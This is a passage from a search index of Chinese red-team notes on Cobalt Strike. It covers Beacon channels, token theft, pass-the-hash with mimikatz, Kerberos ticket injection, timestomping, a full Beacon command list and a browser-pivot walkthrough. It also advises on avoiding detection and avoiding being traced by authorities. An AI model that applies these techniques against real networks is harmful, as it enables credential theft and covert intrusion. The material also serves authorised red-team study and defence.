\u4ee4\u5728\u6a2a\u5411\u79fb\u52a8\u671f\u95f4\u975e\u5e38\u6709\u7528\u3002 \u4f8b\u5982\uff0c \u4f7f\u7528net localgroup \\ \u4e3b\u673a \u5217\u51fa\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7684\u7ec4\u3002 \u4f7f\u7528net localgroup \\ \u4e3b\u673a \u7ec4\u540d \u53ef\u4ee5\u5217\u51fa\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7ec4\u7684\u6210\u5458\u3002 1 1 18.\u4fe1\u4efb\u5173\u7cfb \u5f53\u7528\u6237\u767b\u5f55Windows\u4e3b\u673a\u65f6\uff0c\u5c06\u751f\u6210\u8bbf\u95ee\u4ee4\u724c\u3002\u8be5\u4ee4\u724c\u5305\u542b\u6709\u5173\u7528\u6237\u53ca\u5176\u6743\u9650\u7684\u4fe1\u606f\u3002 \u8bbf\u95ee\u4ee4\u724c\u8fd8\u4fdd\u5b58\u5c06\u7528\u6237\u8ba4\u8bc1\u5230\u540c\u4e00Active Directory\u57df\u4e0a\u7684\u53e6\u4e00\u4e2a\u7cfb\u7edf\u6240\u9700\u7684\u4fe1\u606f\u3002\u6211\u4eec \u53ef\u4ee5\u4ece\u5176\u4ed6\u8fdb\u7a0b\u4e2d\u7a83\u53d6\u4ee4\u724c\u5e76\u5c06\u5176\u5e94\u7528\u4e8e\u6211\u4eec\u7684\u4fe1\u6807\u3002\u6267\u884c\u6b64\u64cd\u4f5c\u65f6\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5 \u4e0e\u8be5\u7528\u6237\u5728\u57df\u4e0a\u7684\u5176\u4ed6\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002 \u4f7f\u7528steal_token\u53ef\u4ee5\u6a21\u62df\u73b0\u6709\u8fdb\u7a0b\u4e2d\u7684\u4ee4\u724c\u3002 \u5229\u7528\u624b\u6cd5\uff1a ps\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b\u5217\u8868 \u6211\u4eec\u6765\u770b\u770b\u5229\u7528pid 1712 \u7684\u5427 \u8fd9\u662f360\u54c8\u54c8\u54c8\u54c8 1 \u8bed\u6cd5\uff1asteal_token [pid] \u5982\u679c\u6211\u4eec\u77e5\u9053\u7528\u6237\u7684\u51ed\u636e\uff1b\u4f7f\u7528make_token\u751f\u6210\u4f20\u9012\u8fd9\u4e9b\u51ed\u636e\u7684\u4ee4\u724c\u3002\u8be5\u4ee4\u724c\u662f\u6211\u4eec\u5f53 \u524d\u4ee4\u724c\u7684\u526f\u672c\uff0c\u5e26\u6709\u5df2\u4fee\u6539\u7684\u5355\u70b9\u767b\u5f55\u4fe1\u606f\u3002\u5b83\u5c06\u663e\u793a\u60a8\u5f53\u524d\u7684\u7528\u6237\u540d\u3002 \u8d26\u53f7\u5bc6\u7801\u53ef\u4ee5\u4f7f\u7528mimikatz dump\u3002 \u4f7f\u7528mimikatz\u4e0eBeacon\u8fdb\u884c\u54c8\u5e0c\u6df7\u5408\u3002\u547d\u4ee4pth\u5c06\u521b\u5efa\u5e76\u6a21\u62df\u8bbf\u95ee\u4ee4\u724c\u4ee5\u4f20\u9012\u6307\u5b9a\u7684\u54c8 \u5e0c\u3002 \u8bed\u6cd5\uff1a make_token [DOMAIN\\user] [password] \u8bed\u6cd5\uff1apth [DOMAIN\\user] [NTLM hash] getuid\u547d\u4ee4\u5c06\u6253\u5370\u60a8\u5f53\u524d\u7684\u4ee4\u724c\u3002 \u4f7f\u7528rev2self\u8fd8\u539f\u4e3a\u539f\u59cb\u4ee4\u724c\u3002 1 1 1 2 \ue10d Kerberos\u7968\u8bc1 \u5c1d\u8bd5\u4f7f\u7528mimikatz 2.0\u751f\u6210\u7684\u91d1\u7968\u3002 \u4f7f\u7528\u5c06Kerberos\u7968\u8bc1\u6ce8\u5165\u5f53\u524d\u4f1a\u8bdd\u3002 \u8fd9\u5c06\u4f7fBeacon\u53ef\u4ee5\u4f7f\u7528\u8be5\u7968\u8bc1\u4e2d\u7684\u6743\u9650\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002 \u4f7f\u7528kerberos_ticket_purge\u6e05\u9664\u4e0e\u6211\u4eec\u7684\u4f1a\u8bdd\u5173\u8054\u7684\u4efb\u4f55kerberos\u51ed\u5355 19.\u5176\u4ed6\u547d\u4ee4 \u4fe1\u6807\u8fd8\u6709\u5176\u4ed6\u4e00\u4e9b\u4e0a\u9762\u6ca1\u6709\u63d0\u5230\u7684\u547d\u4ee4\u3002 \u5728\u660e\u786e\u7684\u547d\u4ee4\u5c06\u6e05\u9664\u706f\u5854\u7684\u4efb\u52a1\u5217\u8868\u3002\u5982\u679c\u8f93\u5165\u6709\u8bef\uff0c\u8bf7\u4f7f\u7528\u5b83\u3002 \u8f93\u5165exit\u8981\u6c42Beacon\u9000\u51fa\u3002 \u4f7f\u7528kill [pid]\u7ec8\u6b62\u8fdb\u7a0b\u3002 \u4f7f\u7528timestomp\u53ef\u4ee5\u5c06\u4e00\u4e2a\u6587\u4ef6\u7684\u201c\u4fee\u6539\u201d\uff0c\u201c\u8bbf\u95ee\u201d\u548c\u201c\u521b\u5efa\u201d\u65f6\u95f4\u4e0e\u53e6\u4e00\u4e2a\u6587\u4ef6\u7684\u201c\u4fee\u6539\u201d\uff0c\u201c\u8bbf \u95ee\u201d\u548c\u201c\u521b\u5efa\u201d\u65f6\u95f4\u8fdb\u884c\u5339\u914d\u3002 by\uff1a\u674e\u6728 \u5fae\u4fe1\u516c\u4f17\u53f7\u9ed1\u767d\u5929\u5b9e\u9a8c\u5ba4 1 \u8bed\u6cd5\uff1akerberos_ticket_use [/ path / to / ticket]","title":"Cobalt strike"},{"location":"redteam/cobalt%20strike/#beacons","text":"Beacon\u662fCobalt Strike\u4e3a\u9ad8\u7ea7\u653b\u51fb\u8005\u5efa\u6a21\u7684Payload\u3002\u4f7f\u7528Beacon\u901a\u8fc7HTTP\uff0cHTTPS \u6216DNS\u51fa\u53e3\u7f51\u7edc\u3002\u800c\u4e14Beacon\u975e\u5e38\u7075\u6d3b\uff0c\u652f\u6301\u5f02\u6b65\u548c\u4ea4\u4e92\u5f0f\u901a\u4fe1\u3002\u5f02\u6b65\u901a\u4fe1\u65e2\u4f4e\u53c8\u6162\u3002 Beacon\u5c06\u901a\u8baf\u672c\u5730\uff0c\u4e0b\u8f7d\u4efb\u52a1\uff0c\u7136\u540e\u8fdb\u5165\u7761\u7720\u72b6\u6001\u3002\u4ea4\u4e92\u5f0f\u901a\u4fe1\u5b9e\u65f6\u53d1\u751f\u3002 Cobalt Strike\u80fd\u591f\u5c06\u591a\u4e2aBeacons\u94fe\u63a5\u5230\u4e00\u4e2a\u94fe\u4e2d\u3002\u8fd9\u4e9b\u94fe\u63a5\u7684Beacon\u63a5\u6536\u5b83\u4eec\u7684\u547d \u4ee4\uff0c\u5e76\u901a\u8fc7\u5176\u94fe\u4e2d\u7684\u7236Beacon\u53d1\u9001\u5b83\u4eec\u7684\u8f93\u51fa\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u94fe\u63a5\u5bf9\u4e8e\u63a7\u5236\u54ea\u4e9b\u4f1a\u8bdd\u6d41\u51fa \u7f51\u7edc\u4ee5\u53ca\u6a21\u62df\u4e00\u4e2a\u89c4\u8303\u7684\u6f14\u793a\u662f\u6709\u7528\u7684\uff0c\u8be5\u6f14\u793a\u5c06\u4ed6\u4eec\u5728\u7f51\u7edc\u5185\u90e8\u7684\u901a\u4fe1\u8def\u5f84\u9650\u5236\u4e3a\u5408 \u7406\u7684\u3002\u8fd9\u79cdBeacons\u94fe\u63a5\u662fCobalt Strike\u4e2d\u6700\u5f3a\u5927\u7684\u529f\u80fd\u4e4b\u4e00\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6570\u636e\u62d3\u6251 \u56fe\u7684\u65b9\u5f0f\u5728\u5c55\u793a\u6211\u4eec\u6bcf\u53f0\u4e0a\u7ebf\u4e3b\u673a\u4e4b\u95f4\u7684\u5173\u7cfb\u548c\u8054\u7cfb\u3002","title":"Beacons\u7684\u4ecb\u7ecd"},{"location":"redteam/cobalt%20strike/#beacon","text":"","title":"\u5e38\u7528beacon\u96a7\u9053"},{"location":"redteam/cobalt%20strike/#1smb-beacon","text":"\u5b98\u7f51\u4ecb\u7ecd\uff1aSMB Beacon\u4f7f\u7528\u547d\u540d\u7ba1\u9053\u901a\u8fc7\u7236\u7ea7Beacon\u8fdb\u884c\u901a\u8baf\uff0c\u5f53\u4e24\u4e2aBeacons\u8fde\u63a5\u540e\uff0c\u5b50 Beacon\u4ece\u7236Beacon\u83b7\u53d6\u5230\u4efb\u52a1\u5e76\u53d1\u9001\u3002 \u56e0\u4e3a\u8fde\u63a5\u7684Beacons\u4f7f\u7528Windows\u547d\u540d\u7ba1\u9053\u8fdb\u884c\u901a\u4fe1\uff0c\u6b64\u6d41\u91cf\u5c01\u88c5\u5728SMB\u534f\u8bae\u4e2d\uff0c\u6240\u4ee5SMB Beacon\u76f8\u5bf9\u9690\u853d\uff0c\u7ed5\u9632\u706b\u5899\u65f6\u53ef\u80fd\u53d1\u6325\u5947\u6548\u3002 \u8fd9\u5f20\u56fe\u5f88\u597d\u7684\u8be0\u91ca\u4e86SMB beacon\u7684\u5de5\u4f5c\u6d41\u7a0b\uff1a","title":"1.SMB Beacon"},{"location":"redteam/cobalt%20strike/#2smb-beacon","text":"\u8fd9\u79cdBeacon\u8981\u6c42\u5177\u6709SMB Beacon\u7684\u4e3b\u673a\u5fc5\u987b\u63a5\u53d7\u7aef\u53e3445\u4e0a\u7684\u8fde\u63a5\u3002 \u5728Listner\u751f\u6210SMB Beacon>\u76ee\u6807\u4e3b\u673a>\u53f3\u952e> spawn as>\u9009\u4e2d\u5bf9\u5e94\u7684Listener> \u4f7f\u7528\u4e00\u4e2a\u5185\u7f51\u76d1\u542c\u5668 \u5728\u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\uff0c\u6211\u76f4\u63a5\u4e0a\u4f20\u9a6c\u5230\u5185\u7f51\u76ee\u6807\u673a\u5668\u4e2d \u751f\u6210\u9a6c\u540e\u4e0a\u4f20\u7684\u76ee\u6807\u4e2d\u53bb\uff08\u8fd9\u91cc\u4e3a\u65b9\u4fbf\u6f14\u793a\uff0c\u8fd9\u5b9e\u6218\u4e2d\u5177\u4f53\u5982\u4f55\u770b\u5b9e\u9645\uff09 \u8fd0\u884c\u6210\u529f\u540e\u5916\u90e8\u53ef\u4ee5\u770b\u5230\u221e\u221e\u8fd9\u4e2a\u5b57\u7b26\uff0c\u8fd9\u5c31\u662f\u6d3e\u751f\u7684SMB Beacon\u3002 \u5f53\u524d\u662f\u8fde\u63a5\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5Beacon\u4e0a\u7528link \u547d\u4ee4\u94fe\u63a5\u5b83\u6216\u8005unlink \u547d\u4ee4\u65ad\u5f00\u5b83\u3002 \u8fd9\u79cdBeacon\u5728\u5185\u7f51\u6a2a\u5411\u6e17\u900f\u4e2d\u8fd0\u7528\u7684\u5f88\u591a","title":"2\u3001SMB Beacon\u4f7f\u7528"},{"location":"redteam/cobalt%20strike/#3dns-beacon","text":"DNS Beacon\u5728\u7ed5\u8fc7\u9632\u706b\u5899 \u6743\u9650\u7ef4\u6301\u4e0a\u975e\u5e38\u6709\u6548\uff0cDNS beacon\u53ef\u8c13\u662f\u6700\u53d7\u6b22\u8fce\u7684Cobalt Strike\u529f\u80fd \u4e4b\u4e00\u3002 \u5b98\u7f51\u7ed9\u51fa\u7684\u539f\u7406\u793a\u610f\u56fe\u5982\u4e0b\uff1a \u4f7f\u7528DNS Beacon\u9996\u5148\u8981\u6709\u4e00\u4e2a\u57df\u540d\uff0c\u57df\u540d\u5efa\u8bae\u7528\u56fd\u5916\u7684\uff0c\u7701\u53bb\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u9ebb\u70e6\uff0c\u4e5f\u9632\u6b62\u88ab\u67e5\u6c34 \u8868\u3002\u57df\u540d\u4f7f\u7528\u4e00\u4e9b\u901a\u7528\u5e73\u5e38\u7684\u5373\u53ef\uff0c\u6574\u4e2a\u914d\u7f6e\u8fc7\u7a0b\u975e\u5e38\u7b80\u5355\uff0c\u4e00\u6761A\u8bb0\u5f55\u548c\u51e0\u6761NS\u8bb0\u5f55\u5373\u53ef\u3002 \u9996\u5148\u8fdb\u5165\u5230\u57df\u540d\u7ba1\u7406\u754c\u9762\uff08\u81ea\u5df1\u7684\u57df\u540d\u8fc7\u671f\u4e86\uff0c\u7528\u4e00\u4e0b404\u5e08\u5085\u7684\u56fe\uff09 \u914d\u7f6eA\u8bb0\u5f55\u6307\u5411\u670d\u52a1\u5668ip \u2192ns\u8bb0\u5f55\u90fd\u6307\u5411A\u8bb0\u5f55\u57df\u540d \u914d\u7f6e\u597d\u4e86\u6211\u4eec\u53ef\u4ee5\u7528nslookup\u6216\u8005dig +trace\u6765\u6d4b\u8bd5\u4e0b\u662f\u5426\u6210\u529f\uff1a \u5982\u679c\u8fd4\u56de\u7684IP\u5730\u5740\u4e0e\u4f60\u7684\u670d\u52a1\u5668IP\u5730\u5740\u5bf9\u5e94\u662f\u6b63\u786e\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u914d\u7f6edns beacon\u7684\u76d1\u542c\u5668 \u4e86\u3002 Host\u90a3\u91cc\u6700\u597d\u586b\u57df\u540d\uff08A\u8bb0\u5f55\u89e3\u6790\u90a3\u4e2a\uff09\uff0c\u4e0d\u8981\u586b\u670d\u52a1\u5668\u7684IP\u5730\u5740\u3002 \u7136\u540e\u786e\u5b9a\u586b\u4e0ans\u8bb0\u5f55\uff0c\u82f1\u6587\u9017\u53f7\u9694\u5f00\uff0c\u7136\u540e\u751f\u6210\u540e\u95e8\u6d4b\u8bd5\u6548\u679c\u3002 \u8fd9\u662f\u4e3b\u673a\u680f\u4e0a\u51fa\u73b0\u4e86\u4e00\u4e2a\u9ed1\u5c4f\u7684logo\uff0c\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u7b49\u5f85\uff0c\u76ee\u6807\u4e3b\u673a\u5373\u53ef\u4e0a\u7ebf\u3002","title":"3\u3001DNS Beacon"},{"location":"redteam/cobalt%20strike/#4ssh-beacon","text":"\u5f53\u5185\u7f51\u6709Linux\u65f6Cobalt Strike\u4e5f\u662f\u8003\u8651\u5230\u7684\u63d0\u4f9b\u4e86SSH\u8fde\u63a5\uff0c\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7metasploit\u7206\u7834\u5185\u7f51\u7684 SSH\u8d26\u53f7\u5bc6\u7801\uff0c\u7136\u540e\u7528\u76ee\u6807\u673a\u7684Beacon\u53bb\u8fde\u63a5\u5c31\u53ef\u4ee5\u4e86\u3002 \u76ee\u524d\u6709\u4e24\u79cdSSH Beacon\u8fde\u63a5\u65b9\u6cd5\uff1a \u2460\u5bc6\u7801\u76f4\u63a5\u8fde\u63a5 Beacon\u547d\u4ee4: ssh [target:port] [user] [pass] \u2461SSH\u5bc6\u5319\u8fde\u63a5 Beacon\u547d\u4ee4: ssh [target:port] [user] [pass] \u8fde\u63a5\u6210\u529f\u540e\uff0c\u5982\u56fe\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e2a\u5b50Beacon\uff1a","title":"4\u3001SSH beacon"},{"location":"redteam/cobalt%20strike/#beacons_1","text":"\u53f3\u952e\u76ee\u6807\u4e3b\u673a\uff0c\u70b9\u51fbInteract\u5373\u4f1a\u8fdb\u5165\u6211\u4eec\u7684beacon\u3002\u5982\u56fe\uff1a \u8fdb\u5165beacon\u6a21\u5f0f\u4e4b\u540e\uff0c\u6211\u4eec\u9996\u5148\u8981\u4fee\u6539CS\u9ed8\u8ba4\u7684**\u5fc3\u8df3\u65f6\u95f4**\uff08sleep\uff09\u3002\u4e00\u822c\u60c5\u51b5\u4e0bCS\u9ed8 \u8ba4\u7684\u5fc3\u8df3\u65f6\u95f4\u4e3a60s\uff0c\u5373\u6bcf\u4e00\u5206\u949f\u76ee\u6807\u4e3b\u673a\u4e0e\u6211\u4eec\u7684Teamserver\u670d\u52a1\u5668\u8fdb\u884c\u4ea4\u4e92\u3002\u90a3\u8fd9 \u6837\u7684\u8bdd\u5c31\u4f1a\u8ba9\u6211\u4eec\u6267\u884c\u64cd\u4f5c\u7684\u54cd\u5e94\u901f\u5ea6\u4f1a\u53d8\u6162\u3002\u5982\u679c\u5b9e\u6218\u4e2d\u5c31\u5efa\u8bae\u4e0d\u8981\u592a\u5feb\uff0c\u4e0d\u7136\u6d41\u91cf \u4f1a\u88ab\u5f88\u5feb\u53d1\u73b0\u3002\u5982\u679c\u662f\u5b9e\u9a8c\uff0c\u90a3\u6211\u4eec\u4e00\u822c\u90fd\u662f\u8bbe\u7f6e\u4e3a0\u6216\u80051\u3002 \u5982\u56fe\uff1a \u5728Beacon\u4e2d\u8bbe\u7f6e\u4e5f\u884c \u5982\u679c\u6211\u4eec\u8981\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5c31\u8981\u4f7f\u7528shell+\u7cfb\u7edf\u547d\u4ee4\u3002\u800c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528cmd\u547d\u4ee4\u7b49\u3002\u5982 \u56fe\uff1a \u8bf7\u6ce8\u610f\uff0c\u4fe1\u6807\u662f\u5f02\u6b65\u6709\u6548\u8d1f\u8f7d\u3002\u547d\u4ee4\u4e0d\u4f1a\u7acb\u5373\u6267\u884c\u3002\u6bcf\u4e2a\u547d\u4ee4\u8fdb\u5165\u961f\u5217\u3002\u5f53Beacon\u7b7e\u5165\uff08\u8fde\u63a5\u5230 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4fe1\u6807\u6bcf60\u79d2\u68c0\u67e5\u4e00\u6b21\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Beacons sleep\u547d\u4ee4\u66f4\u6539\u6b64\u8bbe\u7f6e\u3002\u4f7f\u7528sleep\u52a0 \u8981\u6bcf\u79d2\u8fdb\u884c\u4e00\u6b21\u4fe1\u6807\u68c0\u67e5\u591a\u6b21\uff0c\u8bf7\u5c1d\u8bd5sleep 0\u3002\u8fd9\u662f\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u547d\u4ee4\u5c06\u7acb\u5373\u6267\u884c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u6267\u884cCS\u4e2d\u81ea\u5e26\u7684beacon\u547d\u4ee4 \u4f8b\u5982","title":"Beacons\u7684\u4f7f\u7528"},{"location":"redteam/cobalt%20strike/#beacon-commands","text":"1 2 3 Command Description ------- ----------- argue Spoof arguments for matching processes blockdlls Block non-Microsoft DLLs in child processes browserpivot Setup a browser pivot session bypassuac Spawn a session in a high integrity process cancel Cancel a download that's in\ufffeprogress cd Change directory checkin Call home and post data clear Clear beacon queue connect Connect to a Beacon peer over TCP covertvpn Deploy Covert VPN client cp Copy a file dcsync Extract a password hash from a DC desktop View and interact with target's desktop dllinject Inject a Reflective DLL into a process dllload Load DLL into a process with LoadLibrary() download Download a file downloads Lists file downloads in progress drives List drives on target elevate Try to elevate privileges execute Execute a program on target (no output) execute-assembly Execute a local .NET program in-memory on target exit Terminate the beacon session getprivs Enable system privileges on current token getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process jobkill Kill a long-running post\ufffeexploitation task jobs List long-running post\ufffeexploitation tasks kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Inject a keystroke logger into a process kill Kill a process link Connect to a Beacon peer over a named pipe logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode dns6 Use DNS AAAA as data channel (DNS beacon only) mode http Use HTTP as data channel mv Move a file net Network and host enumeration tool note Assign a note to this Beacon 1 2 portscan Scan a network for open services powerpick Execute a command via Unmanaged PowerShell powershell Execute a command via powershell.exe powershell-import Import a powershell script ppid Set parent PID for spawned post-ex jobs ps Show process list psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host psinject Execute PowerShell command in specific process pth Pass-the-hash using Mimikatz pwd Print current directory reg Query the registry rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward run Execute a program on target (returns output) runas Execute a program as another user runasadmin Execute a program in a high-integrity context runu Execute a program under another PID screenshot Take a screenshot setenv Set an environment variable shell Execute a command via cmd.exe shinject Inject shellcode into a process shspawn Spawn process and inject shellcode into it sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh Use SSH to spawn an SSH session on a host ssh-key Use SSH to spawn an SSH session on a host steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file wdigest Dump plaintext credentials with mimikatz winrm Use WinRM to spawn a session on a host wmi Use WMI to spawn a session on a host Command Description ------- ----------- browserpivot \u6ce8\u5165\u53d7\u5bb3\u8005\u6d4f\u89c8\u5668\u8fdb\u7a0b bypassuac \u7ed5\u8fc7UAC cancel \u53d6\u6d88\u6b63\u5728\u8fdb\u884c\u7684\u4e0b\u8f7d cd \u5207\u6362\u76ee\u5f55 checkin \u5f3a\u5236\u8ba9\u88ab\u63a7\u7aef\u56de\u8fde\u4e00\u6b21 clear \u6e05\u9664beacon\u5185\u90e8\u7684\u4efb\u52a1\u961f\u5217 connect Connect to a Beacon peer over TCP covertvpn \u90e8\u7f72Covert VPN\u5ba2\u6237\u7aef cp \u590d\u5236\u6587\u4ef6 dcsync \u4eceDC\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c desktop \u8fdc\u7a0bVNC dllinject \u53cd\u5c04DLL\u6ce8\u5165\u8fdb\u7a0b dllload \u4f7f\u7528LoadLibrary\u5c06DLL\u52a0\u8f7d\u5230\u8fdb\u7a0b\u4e2d download \u4e0b\u8f7d\u6587\u4ef6 downloads \u5217\u51fa\u6b63\u5728\u8fdb\u884c\u7684\u6587\u4ef6\u4e0b\u8f7d drives \u5217\u51fa\u76ee\u6807\u76d8\u7b26 elevate \u5c1d\u8bd5\u63d0\u6743 execute \u5728\u76ee\u6807\u4e0a\u6267\u884c\u7a0b\u5e8f(\u65e0\u8f93\u51fa) execute-assembly \u5728\u76ee\u6807\u4e0a\u5185\u5b58\u4e2d\u6267\u884c\u672c\u5730.NET\u7a0b\u5e8f exit \u9000\u51fabeacon getprivs Enable system privileges on current token getsystem \u5c1d\u8bd5\u83b7\u53d6SYSTEM\u6743\u9650 getuid \u83b7\u53d6\u7528\u6237ID hashdump \u8f6c\u50a8\u5bc6\u7801\u54c8\u5e0c\u503c help \u5e2e\u52a9 inject \u5728\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u751f\u6210\u4f1a\u8bdd jobkill \u6740\u6b7b\u4e00\u4e2a\u540e\u53f0\u4efb\u52a1 jobs \u5217\u51fa\u540e\u53f0\u4efb\u52a1 kerberos_ccache_use \u4ececcache\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e\u5e94\u7528\u4e8e\u6b64\u4f1a\u8bdd kerberos_ticket_purge \u6e05\u9664\u5f53\u524d\u4f1a\u8bdd\u7684\u7968\u636e kerberos_ticket_use \u4eceticket\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e\u5e94\u7528\u4e8e\u6b64\u4f1a\u8bdd keylogger \u952e\u76d8\u8bb0\u5f55 kill \u7ed3\u675f\u8fdb\u7a0b link Connect to a Beacon peer over a named pipe logonpasswords \u4f7f\u7528mimikatz\u8f6c\u50a8\u51ed\u636e\u548c\u54c8\u5e0c\u503c ls \u5217\u51fa\u6587\u4ef6 make_token \u521b\u5efa\u4ee4\u724c\u4ee5\u4f20\u9012\u51ed\u636e mimikatz \u8fd0\u884cmimikatz mkdir \u521b\u5efa\u4e00\u4e2a\u76ee\u5f55 mode dns \u4f7f\u7528DNS A\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053(\u4ec5\u9650DNS beacon) mode dns-txt \u4f7f\u7528DNS TXT\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053(\u4ec5\u9650D beacon) mode dns6 \u4f7f\u7528DNS AAAA\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053(\u4ec5\u9650DNS beacon) mode http \u4f7f\u7528HTTP\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053 mv \u79fb\u52a8\u6587\u4ef6 net net\u547d\u4ee4 note \u5907\u6ce8 portscan \u8fdb\u884c\u7aef\u53e3\u626b\u63cf powerpick \u901a\u8fc7Unmanaged PowerShell\u6267\u884c\u547d\u4ee4 powershell \u901a\u8fc7powershell.exe\u6267\u884c\u547d\u4ee4 powershell-import \u5bfc\u5165powershell\u811a\u672c ppid Set parent PID for spawned post-ex jobs ps \u663e\u793a\u8fdb\u7a0b\u5217\u8868 p**ec Use a service to spawn a session on a host p**ec_psh Use PowerShell to spawn a session on a host psinject \u5728\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u6267\u884cPowerShell\u547d\u4ee4 pth \u4f7f\u7528Mimikatz\u8fdb\u884c\u4f20\u9012\u54c8\u5e0c pwd \u5f53\u524d\u76ee\u5f55\u4f4d\u7f6e reg Query the registry rev2self \u6062\u590d\u539f\u59cb\u4ee4\u724c rm \u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939 rportfwd \u7aef\u53e3\u8f6c\u53d1 run \u5728\u76ee\u6807\u4e0a\u6267\u884c\u7a0b\u5e8f(\u8fd4\u56de\u8f93\u51fa) runas \u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u6743\u9650\u6267\u884c\u7a0b\u5e8f runasadmin \u5728\u9ad8\u6743\u9650\u4e0b\u6267\u884c\u7a0b\u5e8f runu Execute a program under another PID screenshot \u5c4f\u5e55\u622a\u56fe setenv \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf shell cmd\u6267\u884c\u547d\u4ee4 shinject \u5c06shellcode\u6ce8\u5165\u8fdb\u7a0b shspawn \u751f\u6210\u8fdb\u7a0b\u5e76\u5c06shellcode\u6ce8\u5165\u5176\u4e2d sleep \u8bbe\u7f6e\u7761\u7720\u5ef6\u8fdf\u65f6\u95f4 socks \u542f\u52a8SOCKS4\u4ee3\u7406 socks stop \u505c\u6b62SOCKS4 spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh \u4f7f\u7528ssh\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a ssh-key \u4f7f\u7528\u5bc6\u94a5\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a steal_token \u4ece\u8fdb\u7a0b\u4e2d\u7a83\u53d6\u4ee4\u724c timestomp \u5c06\u4e00\u4e2a\u6587\u4ef6\u65f6\u95f4\u6233\u5e94\u7528\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6 unlink Disconnect from parent Beacon upload \u4e0a\u4f20\u6587\u4ef6 wdigest \u4f7f\u7528mimikatz\u8f6c\u50a8\u660e\u6587\u51ed\u636e winrm \u4f7f\u7528WinRM\u5728\u4e3b\u673a\u4e0a\u751f\u6210\u4f1a\u8bdd wmi \u4f7f\u7528WMI\u5728\u4e3b\u673a\u4e0a\u751f\u6210\u4f1a\u8bdd argue \u8fdb\u7a0b\u53c2\u6570\u6b3a\u9a97 \u4e00\u4e9b\u4f8b\u5b50 1.Browserpivot \u6ce8\u5165\u53d7\u5bb3\u8005\u6d4f\u89c8\u5668\u8fdb\u7a0b\uff0c\u7136\u540e\u5f00\u542fHTTP\u4ee3\u7406 \u6211\u4eec\u5148\u4f7f\u7528ps / tasklist \u627e\u5230\u6d4f\u89c8\u5668\u7684\u8fdb\u7a0bid\u503c \u6ce8\u5165\u8fdb\u7a0b\uff1a \u6ce8\u5165\u6d4f\u89c8\u5668\u8fdb\u7a0b\u6210\u529f\u4e4b\u540e\uff0c\u4f1a\u663e\u793a\uff1a Browser Pivot HTTP proxy is at: xxx.xxx.xxx.xxx:\u7aef \u53e3\u53f7 1 beacon> browserpivot 1580 \u7136\u540e\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u672c\u5730HTTP\u6d4f\u89c8\u5668\u4ee3\u7406 \u7136\u5f53\u88ab\u653b\u51fb\u8005\u5173\u95ed\u6d4f\u89c8\u5668\u7684\u65f6\u5019\uff0c\u4ee3\u7406\u4e5f\u5c31\u5931\u6548\u4e86\uff0c\u5173\u95ed\u6b64\u4ee3\u7406\u53ef\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a browserpivot stop \u6b64\u529f\u80fd\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u53d7\u5230\u5a01\u80c1\u7684\u7528\u6237\u7684\u6d4f\u89c8\u4f1a\u8bdd\u3002 \u8fd9\u79cd\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\uff1a \u53d7\u5bb3\u8005\u4f7f\u7528Internet Explorer\u767b\u5f55\u5230\u67d0\u4e9bWeb\u5e94\u7528\u7a0b\u5e8f\u3002 